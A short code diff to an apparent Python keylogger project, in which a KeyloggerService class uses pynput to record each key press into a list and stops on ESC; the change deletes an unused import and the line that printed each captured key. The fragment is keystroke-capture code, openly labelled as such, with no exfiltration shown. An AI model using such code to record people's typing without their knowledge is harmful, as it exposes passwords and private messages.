@@ -1,5 +1,3 @@
-from time import sleep
-
 from inter_face import IKeyLogger
 from typing import List
 from pynput.keyboard import Key, Listener, KeyCode
@@ -32,7 +30,6 @@ class KeyloggerService(IKeyLogger):
 
     def press(self,key):
         key_str = self.key_to_string(key)
-        print(key_str)
         if key_str == "<ESC>":
             self.stop_logging()
         self.presses.append(key_str)
